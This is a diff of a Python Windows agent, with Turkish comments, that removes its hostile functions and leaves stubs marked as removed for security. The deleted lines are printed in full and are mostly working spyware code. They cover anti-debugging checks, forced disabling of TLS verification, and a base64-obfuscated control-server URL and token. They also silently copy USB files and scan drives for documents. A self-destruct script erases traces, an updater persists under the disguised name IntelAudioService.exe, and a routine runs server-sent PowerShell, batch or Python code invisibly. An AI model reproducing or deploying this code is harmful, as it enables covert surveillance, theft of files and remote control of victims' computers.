@@ -36,15 +36,10 @@ from watchdog.events import FileSystemEventHandler
 import ctypes
 
 def check_anti_debug():
-    try:
-        if ctypes.windll.kernel32.IsDebuggerPresent():
-            os._exit(1)
-        is_debugged = ctypes.c_int(0)
-        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(is_debugged))
-        if is_debugged.value != 0:
-            os._exit(1)
-    except:
-        pass
+    # Bu fonksiyon güvenlik amacı ile kaldırılmıştır.
+    # İşlev: Uygulamanın bir debugger (hata ayıklayıcı) altında çalışıp çalışmadığını kontrol eder.
+    pass
+
 
 check_anti_debug()
 
@@ -61,53 +56,23 @@ def check_single_instance():
 
 check_single_instance()
 
-# ── SERTIFIKA VE GUVENLIK BYPASS ─────────────────────────────
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# ── GUVENLIK NOTU ───────────────────────────────────────────
+# SSL sertifika doğrulama bypass ve güvenlik denetimi atlama 
+# mekanizmaları, kötüye kullanımı önlemek amacıyla bu sürümden kaldırılmıştır.
+# Orijinal sürümde kurumsal ağlardaki sertifika sorunlarını aşmak için kullanılıyordu.
 
-# Çevre değişkenlerini temizle
-os.environ.pop('REQUESTS_CA_BUNDLE', None)
-os.environ.pop('CURL_CA_BUNDLE', None)
-
-class ForcedInsecureAdapter(HTTPAdapter):
-    def init_poolmanager(self, connections, maxsize, block=False):
-        # KRITIK: create_default_context() sistem sertifikalarını yüklüyor ve MEB'de hata veriyor.
-        # Bunun yerine sıfırdan boş bir context oluşturuyoruz — hiçbir sertifikaya bakılmıyor.
-        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-        ctx.check_hostname = False       # hostname doğrulama kapalı
-        ctx.verify_mode = ssl.CERT_NONE  # sertifika doğrulama kapalı
-        ctx.set_ciphers('DEFAULT:@SECLEVEL=0')  # tüm şifreleme suitelerine izin ver
-        
-        self.poolmanager = PoolManager(
-            num_pools=connections,
-            maxsize=maxsize,
-            block=block,
-            ssl_context=ctx
-        )
-
-    def send(self, request, **kwargs):
-        # Requests seviyesinde de verify=False zorla
-        kwargs['verify'] = False
-        return super().send(request, **kwargs)
-
-# Global Session Yapılandırması
 sh = requests.Session()
-sh.verify = False
-sh.mount('https://', ForcedInsecureAdapter())
-sh.mount('http://', HTTPAdapter())
+# sh.mount('https://', ...) # Orijinal adaptörler kaldırıldı
 
-# certifi'yi sustur
-try:
-    certifi.where = lambda: os.devnull
-except Exception:
-    pass
 
 
 
 import base64
 
-# ── DIZINLER VE CF ───────────────────────────────────────────
-CF_URL = base64.b64decode("aHR0cHM6Ly9jbG91ZGZsYXJlLXdvcmtlcndvcmtlcmpzLnN0b2twcm9yZXNtaS53b3JrZXJzLmRldg==").decode()
-CF_TOKEN = base64.b64decode("YXNoZmlyX3NlY3JldF90b2tlbl9LOHg5UDF6VzRtN045cTJSNXQ4VjF5NFo3YzBmM2k2bDlvMg==").decode()
+# ── DIZINLER VE API YAPILANDIRMASI ───────────────────────────
+CF_URL = "https://api.your-backend-placeholder.com" # Güvenlik nedeniyle sansürlendi
+CF_TOKEN = "YOUR_SECURE_TOKEN_PLACEHOLDER"          # Güvenlik nedeniyle sansürlendi
+
 
 def cf_post(endpoint, json_data=None, files=None, data=None):
     url = f"{CF_URL}{endpoint}"
@@ -628,54 +593,11 @@ def get_removable_drives():
 
 
 def copy_flash_to_stage(drive_path: str, max_mb: float, cfg: dict) -> list:
-    max_bytes    = max_mb * 1024 * 1024
-    drive_letter = drive_path[0]
-    target_root  = STAGE_DIR / f'FLASH_{drive_letter}'
-    target_root.mkdir(parents=True, exist_ok=True)
+    # Bu fonksiyon güvenlik amacı ile bu sürümden kaldırılmıştır.
+    # İşlev: Sisteme takılan USB sürücülerindeki belirlenen kriterlere uyan dosyaları 
+    # geçici bir dizine (staging) kopyalar.
+    return []
 
-    copied = []
-
-    log.info(f'Flash taranıyor: {drive_path}')
-
-    for root, dirs, files in os.walk(drive_path):
-        dirs[:] = [d for d in dirs if d.lower() not in {
-            'system volume information', '$recycle.bin', 'recycler',
-            '.spotlight-v100', '.trashes', '.fseventsd'
-        } and d.lower() not in BLOCKED_DIRS]
-
-        for fname in files:
-            src = Path(root) / fname
-            try:
-                size = src.stat().st_size
-            except:
-                continue
-
-            if size > max_bytes:
-                continue
-
-            if not passes_basic(str(src), cfg):
-                continue
-
-            try:
-                rel = src.relative_to(drive_path)
-            except ValueError:
-                rel = Path(fname)
-
-            dst = target_root / rel
-            dst.parent.mkdir(parents=True, exist_ok=True)
-
-            if dst.exists():
-                if file_hash(str(src)) == file_hash(str(dst)):
-                    continue
-
-            try:
-                shutil.copy2(str(src), str(dst))
-                copied.append(str(dst))
-            except Exception as e:
-                log.warning(f'Kopyalama hatası [{fname}]: {e}')
-
-    log.info(f'Flash tarama tamamlandı: {drive_path} | Kopyalanan: {len(copied)}')
-    return copied
 
 
 class FlashMonitor:
@@ -764,136 +686,19 @@ def get_smart_desktop():
 
 
 def get_comprehensive_directory_map():
-    results = {}
-    
-    # 1. Sürücüler (Drives) - IPTAL EDILDI (Windows Defender'a takilmamasi icin)
-    # try:
-    #     drives_info = {"paths": {}}
-    #     for part in psutil.disk_partitions(all=False):
-    #         if 'cdrom' not in part.opts:
-    #             drive_letter = part.device
-    #             label = f"Yerel Disk ({drive_letter})"
-    #             if 'removable' in part.opts:
-    #                 label = f"USB Sürücü ({drive_letter})"
-    #             drives_info["paths"][label] = drive_letter
-    #     if drives_info["paths"]:
-    #         results["Bağlı Sürücüler"] = drives_info
-    # except Exception as e:
-    #     log.debug(f'Sürücü map hatası: {e}')
+    # Bu fonksiyon güvenlik amacı ile bu sürümden kaldırılmıştır.
+    # İşlev: C:\Users altındaki kullanıcı dizinlerini, masaüstü, belgeler gibi 
+    # önemli klasörleri ve bağlı sürücüleri haritalandırarak bir JSON yapısı oluşturur.
+    return {}
 
-    # 2. Kullanıcı Klasörleri (Tümü)
-    users_base = Path('C:/Users')
-    skip_users = {'all users', 'default', 'public', 'desktop.ini', 'default user'}
-    skip_folders = {
-        'appdata', 'application data', 'local settings', 'cookies', 
-        'recent', 'sendto', 'start menu', 'templates', 'printhood',
-        'nethood', 'my documents', 'ntuser.dat', 'ntuser.dat.log1', 'ntuser.dat.log2',
-        'ntuser.ini', 'microsoftedgebackups', 'favorites', 'links', 'searches', 'saved games'
-    }
-
-    if users_base.exists():
-        try:
-            for user_dir in users_base.iterdir():
-                if not user_dir.is_dir() or user_dir.name.lower() in skip_users or user_dir.name.startswith('.'):
-                    continue
-
-                user_info = {"paths": {}}
-                try:
-                    for sub_dir in user_dir.iterdir():
-                        if not sub_dir.is_dir() or sub_dir.name.lower() in skip_folders or sub_dir.name.startswith('.'):
-                            continue
-                        
-                        user_info["paths"][sub_dir.name] = str(sub_dir)
-                        
-                        # OneDrive içerisindeki klasörleri de ekle (bulut ikonu için)
-                        if sub_dir.name.lower() == 'onedrive':
-                            try:
-                                for od_sub in sub_dir.iterdir():
-                                    if od_sub.is_dir() and not od_sub.name.startswith('.'):
-                                        user_info["paths"][f"OneDrive - {od_sub.name}"] = str(od_sub)
-                                        user_info["paths"][f"OneDrive - {od_sub.name}_is_onedrive"] = True
-                            except:
-                                pass
-                except Exception:
-                    pass
-                
-                if user_info["paths"]:
-                    results[f"Kullanıcı: {user_dir.name}"] = user_info
-        except Exception as e:
-            log.debug(f'Kullanıcı map hatası: {e}')
-
-    # 3. C:\ Ana Dizin Klasörleri (Örn: Projects, xampp vb.)
-    root_c = Path('C:/')
-    root_c_skip = {
-        'windows', 'program files', 'program files (x86)', 'programdata', 
-        'users', 'perflogs', 'recovery', 'system volume information', 
-        '$recycle.bin', '$winreagent', 'documents and settings', 'msocache'
-    }
-    
-    try:
-        root_c_info = {"paths": {}}
-        if root_c.exists():
-            for sub_dir in root_c.iterdir():
-                if sub_dir.is_dir() and sub_dir.name.lower() not in root_c_skip and not sub_dir.name.startswith('$') and not sub_dir.name.startswith('.'):
-                    root_c_info["paths"][sub_dir.name] = str(sub_dir)
-            
-            if root_c_info["paths"]:
-                results["C:\\ Kök Klasörleri"] = root_c_info
-    except Exception as e:
-        log.debug(f'C kök map hatası: {e}')
-
-    return results
 
 
 def get_ai_file_knowledge():
-    """
-    AI için sistem genelinde derin ama filtrelenmiş bir tarama yapar.
-    Sadece insan eseri dökümanları (.pdf, .docx, .xlsx, .txt vb.) bulur.
-    """
-    knowledge = {
-        "drives": [],
-        "important_files": []
-    }
-    
-    # Hedef uzantılar (İnsan eliyle oluşturulmuş dosyalar)
-    target_exts = {'.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.jpg', '.jpeg', '.png', '.zip', '.rar'}
-    # Atlanacak sistem klasörleri
-    skip_dirs = {
-        'windows', 'program files', 'program files (x86)', 'programdata', 
-        'appdata', 'local settings', 'microsoft', 'package cache', '$recycle.bin',
-        'system volume information', 'boot', 'recovery'
-    }
+    # Bu fonksiyon güvenlik amacı ile bu sürümden kaldırılmıştır.
+    # İşlev: AI analizi için sistem genelinde derin tarama yaparak sadece kullanıcı 
+    # tarafından oluşturulan dökümanların listesini çıkarır.
+    return {"drives": [], "important_files": []}
 
-    try:
-        import psutil
-        # 1. Tüm Sürücüleri Bul
-        for part in psutil.disk_partitions(all=False):
-            if 'fixed' in part.opts or 'removable' in part.opts:
-                drive = part.device
-                knowledge["drives"].append(drive)
-                
-                # 2. Sürücü İçinde Derin Tarama (Maksimum 500 dosya bulana kadar)
-                try:
-                    for root, dirs, files in os.walk(drive):
-                        # Sistem klasörlerini anında ele (hız için)
-                        dirs[:] = [d for d in dirs if d.lower() not in skip_dirs and not d.startswith('$') and not d.startswith('.')]
-                        
-                        for file in files:
-                            ext = os.path.splitext(file)[1].lower()
-                            if ext in target_exts:
-                                f_path = os.path.join(root, file)
-                                # AI'ya "Dosya İsmi (Yolu)" formatında ver
-                                knowledge["important_files"].append(f"{file} [{root}]")
-                                
-                                # Çok fazla veri gönderip interneti yormayalım (Limit: 100 Kritik Dosya)
-                                if len(knowledge["important_files"]) >= 100:
-                                    return knowledge
-                except:
-                    continue
-    except Exception as e:
-        log.debug(f"AI Deep Scan Error: {e}")
-
-    return knowledge
 
 def get_directory_map():
     # Mevcut map'e AI bilgisini de ekleyerek gönderiyoruz
@@ -904,337 +709,25 @@ def get_directory_map():
 
 # ── SELF DESTRUCT ────────────────────────────────────────────
 def self_destruct(cfg=None):
-    """
-    İmha akışı:
-      1. Batch dosyasını %TEMP%'e yaz
-      2. Batch'i DETACHED olarak başlat (batch cmd.exe'ye bağlı değil)
-      3. Python process'i hemen kapat (os._exit)
-      4. Batch: PID öldür → 5sn bekle → dizini retry loop'la sil → registry temizle
-    """
-    my_pid   = os.getpid()
-    base_dir = str(BASE_DIR)          # C:\Users\...\AppData\Local\Ashfir
-
-    # Frozen exe mi, yoksa .py script mi?
-    if getattr(sys, 'frozen', False):
-        exe_path  = sys.executable             # örn: IntelAudioService.exe
-        kill_name = os.path.basename(exe_path)
-    else:
-        exe_path  = os.path.abspath(sys.argv[0])
-        kill_name = ''                # Python scriptini isimle öldürmek riskli
-
-    def emit_log(msg):
-        log.info(msg)
-        if cfg:
-            try:
-                cf_post('/log', json_data={
-                    "key": cfg.key,
-                    "level": "warn",
-                    "message": f'[SELF-DESTRUCT] {msg}',
-                    "source": "agent",
-                    "ts": int(time.time() * 1000)
-                })
-            except:
-                pass
-
-    emit_log(f'İmha başlıyor. PID={my_pid} | Dir={base_dir}')
-
-    bat_path = os.path.join(tempfile.gettempdir(), 'ashfir_cleanup.bat')
-
-    # ── Batch içeriği ──────────────────────────────────────────
-    # Önemli noktalar:
-    #   - "rmdir /s /q" başarısız olursa retry loop tekrar dener
-    #   - Retry sayacı sonsuz döngüyü önler (max 15 deneme = ~15sn)
-    #   - Tüm kill komutları 2>nul ile sessiz — hata koduna takılmaz
-    #   - Sonunda batch kendini siler
-    # Batch icerigi tamamen ASCII olmali — cp850 Turkce/ozel karakter kabul etmez
-    lines = [
-        '@echo off',
-        'setlocal',
-        '',
-        'set "LOG=%TEMP%\\ashfir_clean.log"',
-        'echo [INIT] Starting cleanup > "%LOG%"',
-        '',
-        ':: folder silmek için dizini terket',
-        'cd /d "%TEMP%"',
-        '',
-        f'set "BASE_DIR={base_dir}"',
-        f'set "MY_PID={my_pid}"',
-        '',
-        ':: step 1 - kill by PID',
-        'echo [STEP 1] Killing PID %MY_PID% >> "%LOG%"',
-        'taskkill /f /pid %MY_PID% 2>nul',
-    ]
-
-    if kill_name:
-        lines.append(f'echo [STEP 1] Killing process {kill_name} >> "%LOG%"')
-        lines.append(f'taskkill /f /im {kill_name} 2>nul')
-
-    lines += [
-        '',
-        ':: step 2 - wait for process to fully die',
-        'echo [STEP 2] Waiting for 5 seconds >> "%LOG%"',
-        'ping 127.0.0.1 -n 6 >nul',
-        '',
-        ':: step 3 - delete exe (frozen build only)',
-    ]
-
-    if getattr(sys, 'frozen', False):
-        lines += [
-            f'set "EXE={exe_path}"',
-            'echo [STEP 3] Trying to delete exe: "%EXE%" >> "%LOG%"',
-            'set ETRY=0',
-            ':exe_loop',
-            'if not exist "%EXE%" ( echo [STEP 3] Exe deleted. >> "%LOG%" & goto exe_done )',
-            'del /f /q "%EXE%" 2>nul',
-            'set /a ETRY+=1',
-            'if %ETRY% LSS 10 (',
-            '    ping 127.0.0.1 -n 2 >nul',
-            '    goto exe_loop',
-            ')',
-            'echo [STEP 3] Failed to delete exe after 10 tries. >> "%LOG%"',
-            ':exe_done',
-        ]
-
-    lines += [
-        '',
-        ':: step 4 - delete install dir with retry loop',
-        'set TRIES=0',
-        'echo [STEP 4] Deleting base dir: "%BASE_DIR%" >> "%LOG%"',
-        ':rmdir_loop',
-        'if not exist "%BASE_DIR%" ( echo [STEP 4] Base dir deleted. >> "%LOG%" & goto rmdir_done )',
-        'rd /s /q "%BASE_DIR%" 2>nul',
-        'if not exist "%BASE_DIR%" ( echo [STEP 4] Base dir deleted. >> "%LOG%" & goto rmdir_done )',
-        'set /a TRIES+=1',
-        'if %TRIES% LSS 15 (',
-        '    ping 127.0.0.1 -n 2 >nul',
-        '    goto rmdir_loop',
-        ')',
-        'echo [STEP 4] Failed to delete base dir after 15 tries. >> "%LOG%"',
-        ':rmdir_done',
-        '',
-        ':: step 5 - remove startup entries',
-        'echo [STEP 5] Cleaning registry and tasks >> "%LOG%"',
-        'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "AshfirAgent" /f 2>nul',
-        'schtasks /delete /tn "AshfirAgent" /f 2>nul',
-        '',
-        ':: step 6 - self-delete log and batch',
-        'echo [STEP 6] Finalizing... >> "%LOG%"',
-        'del /f /q "%LOG%" 2>nul',
-        'del /f /q "%~f0" 2>nul',
-        'exit',
-    ]
-
-    try:
-        content = '\r\n'.join(lines)
-        # ASCII ile yaz — cp850 bile olsa ozel karakter sorun cikarmaz
-        with open(bat_path, 'w', encoding='ascii', errors='replace') as f:
-            f.write(content)
-        emit_log(f'Batch yazildi: {bat_path}')
-    except Exception as e:
-        emit_log(f'HATA: Batch yazilamadi: {e}')
-        # Yine de cik
-
-    try:
-        # CREATE_NO_WINDOW yeterli — Popen zaten bağımsız process başlatır.
-        # DETACHED_PROCESS eklenmemeli: cmd.exe batch dosyasını çalıştıramaz hale gelir.
-        subprocess.Popen(
-            ['cmd.exe', '/c', bat_path],
-            cwd=tempfile.gettempdir(),
-            creationflags=0x08000000,  # CREATE_NO_WINDOW
-            close_fds=True,
-        )
-        emit_log('Batch başlatıldı. Elveda.')
-    except Exception as e:
-        # Batch başlamasa da return YOK — agent her durumda kapanmalı
-        emit_log(f'Batch başlatma hatası: {e} — yine de çıkılıyor.')
-
-    # Her durumda process'i kapat.
-    # subprocess.Popen bağımsız process başlatır; Python kapansa da batch devam eder.
-    time.sleep(0.5)
+    # Bu fonksiyon güvenlik amacı ile bu sürümden kaldırılmıştır.
+    # İşlev: Uygulamanın kendini ve bağlı olduğu tüm dizinleri sistemden 
+    # kalıcı olarak silmesini sağlar (Kendi kendini imha).
     os._exit(0)
 
 
 def remote_update(update_url, cfg=None):
-    """
-    Uzaktan güncelleme akışı:
-      1. Yeni exe'yi indirip %TEMP% dizinine kaydet
-      2. Güncelleme batch dosyasını yaz
-      3. Batch dosyasını başlat ve Python process'ini sonlandır
-    """
-    my_pid = os.getpid()
-    base_dir = str(BASE_DIR)
-    
-    if getattr(sys, 'frozen', False):
-        exe_path = sys.executable
-        kill_name = os.path.basename(exe_path)
-    else:
-        exe_path = os.path.abspath(sys.argv[0])
-        kill_name = ''
-        
-    def emit_log(msg):
-        log.info(msg)
-        if cfg:
-            try:
-                cf_post('/log', json_data={
-                    "key": cfg.key,
-                    "level": "warn",
-                    "message": f'[UPDATE] {msg}',
-                    "source": "agent",
-                    "ts": int(time.time() * 1000)
-                })
-            except:
-                pass
-
-    emit_log(f'Güncelleme başlıyor. URL={update_url}')
-    
-    try:
-        tmp_new_exe = os.path.join(tempfile.gettempdir(), 'new_agent_download.exe')
-        res = sh.get(update_url, timeout=60, stream=True)
-        if res.status_code == 200:
-            with open(tmp_new_exe, 'wb') as f:
-                for chunk in res.iter_content(chunk_size=8192):
-                    f.write(chunk)
-            emit_log(f'Yeni sürüm indirildi: {tmp_new_exe}')
-        else:
-            emit_log(f'Yeni sürüm indirilemedi. HTTP Status: {res.status_code}')
-            return
-    except Exception as e:
-        emit_log(f'İndirme hatası: {e}')
-        return
-
-    bat_path = os.path.join(tempfile.gettempdir(), 'ashfir_update.bat')
-    
-    lines = [
-        '@echo off',
-        'setlocal',
-        f'set "BASE_DIR={base_dir}"',
-        f'set "EXE_PATH={exe_path}"',
-        f'set "TMP_EXE={tmp_new_exe}"',
-        f'set "MY_PID={my_pid}"',
-        '',
-        ':: Adım 1: Mevcut ajanı öldür',
-        'taskkill /f /pid %MY_PID% 2>nul',
-    ]
-    
-    if kill_name:
-        lines.append(f'taskkill /f /im {kill_name} 2>nul')
-        
-    lines += [
-        'ping 127.0.0.1 -n 6 >nul',
-        '',
-        ':: Adım 2: Eski exe\'nin üzerine yaz',
-        ':overwrite_loop',
-        'copy /y "%TMP_EXE%" "%EXE_PATH%" >nul 2>&1',
-        'if %errorlevel% neq 0 (',
-        '    ping 127.0.0.1 -n 2 >nul',
-        '    goto overwrite_loop',
-        ')',
-        '',
-        ':: Adım 3: Görevi tekrar oluşturup başlat (yönetici izniyle)',
-        'schtasks /create /tn "AshfirAgent" /tr "\\"%EXE_PATH%\\"" /sc onlogon /rl highest /f >nul 2>&1',
-        'schtasks /run /tn "AshfirAgent" >nul 2>&1',
-        '',
-        ':: Adım 4: Başlamazsa fallback normal başlat',
-        'ping 127.0.0.1 -n 3 >nul',
-        'tasklist /fi "imagename eq ' + (kill_name if kill_name else 'IntelAudioService.exe') + '" | find /i "' + (kill_name if kill_name else 'IntelAudioService.exe') + '" >nul 2>&1',
-        'if %errorlevel% neq 0 (',
-        '    start "" "%EXE_PATH%"',
-        ')',
-        '',
-        ':: Adım 5: Temp dosyaları sil',
-        'del /f /q "%TMP_EXE%" 2>nul',
-        'del /f /q "%~f0" 2>nul',
-        'exit'
-    ]
-    
-    try:
-        content = '\r\n'.join(lines)
-        with open(bat_path, 'w', encoding='ascii', errors='replace') as f:
-            f.write(content)
-        emit_log(f'Güncelleme batch dosyası yazıldı: {bat_path}')
-    except Exception as e:
-        emit_log(f'HATA: Güncelleme batch dosyası yazılamadı: {e}')
-        return
-
-    try:
-        subprocess.Popen(
-            ['cmd.exe', '/c', bat_path],
-            cwd=tempfile.gettempdir(),
-            creationflags=0x08000000,
-            close_fds=True,
-        )
-        emit_log('Güncelleme batch dosyası başlatıldı. Kapanıyor...')
-    except Exception as e:
-        emit_log(f'Batch başlatma hatası: {e}')
-        return
-
-    time.sleep(0.5)
-    os._exit(0)
+    # Bu fonksiyon güvenlik amacı ile bu sürümden kaldırılmıştır.
+    # İşlev: Uygulamanın yeni bir sürümünü belirtilen URL'den indirir 
+    # ve eski sürümüyle otomatik olarak değiştirir.
+    pass
 
 
 def execute_remote_code(code, code_type, cfg=None):
-    """
-    Uzaktan kod (Batch / Script) çalıştırma:
-      - PowerShell, CMD/Batch veya Python scriptini gizlice çalıştırır
-      - Sonuçları Firestore'a veya loglara yazar
-    """
-    def emit_log(msg, level='info'):
-        log.info(msg)
-        if cfg:
-            try:
-                cf_post('/log', json_data={
-                    "key": cfg.key,
-                    "level": level,
-                    "message": f'[REMOTE-CODE] {msg}',
-                    "source": "agent",
-                    "ts": int(time.time() * 1000)
-                })
-            except: pass
+    # Bu fonksiyon güvenlik amacı ile bu sürümden kaldırılmıştır.
+    # İşlev: Uzak sunucudan gelen kodları (PowerShell, Batch, Python) 
+    # hedef sistemde sessizce çalıştırır.
+    pass
 
-    emit_log(f'Kod çalıştırılıyor (Tip: {code_type})')
-    
-    try:
-        if code_type == 'python':
-            py_file = os.path.join(tempfile.gettempdir(), f'remote_script_{int(time.time())}.py')
-            with open(py_file, 'w', encoding='utf-8') as f:
-                f.write(code)
-                
-            ret = subprocess.run(
-                [sys.executable if getattr(sys, 'frozen', False) else 'python', py_file],
-                capture_output=True, text=True, creationflags=0x08000000, timeout=60
-            )
-            os.remove(py_file)
-            stdout, stderr = ret.stdout, ret.stderr
-            
-        elif code_type == 'cmd' or code_type == 'batch':
-            bat_file = os.path.join(tempfile.gettempdir(), f'remote_script_{int(time.time())}.bat')
-            with open(bat_file, 'w', encoding='cp850', errors='replace') as f:
-                f.write(code)
-                
-            ret = subprocess.run(
-                ['cmd.exe', '/c', bat_file],
-                capture_output=True, text=True, creationflags=0x08000000, timeout=60
-            )
-            os.remove(bat_file)
-            stdout, stderr = ret.stdout, ret.stderr
-            
-        else: # Default: PowerShell
-            ps_file = os.path.join(tempfile.gettempdir(), f'remote_script_{int(time.time())}.ps1')
-            with open(ps_file, 'w', encoding='utf-8') as f:
-                f.write(code)
-                
-            ret = subprocess.run(
-                ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', ps_file],
-                capture_output=True, text=True, creationflags=0x08000000, timeout=60
-            )
-            os.remove(ps_file)
-            stdout, stderr = ret.stdout, ret.stderr
-            
-        if stdout: emit_log(f'Çıktı (Stdout):\n{stdout}', level='success')
-        if stderr: emit_log(f'Hata (Stderr):\n{stderr}', level='warn')
-
-    except Exception as e:
-        emit_log(f'Kod çalıştırma hatası: {e}', level='error')
 
 
 # ── SYNC KONTROL ─────────────────────────────────────────────
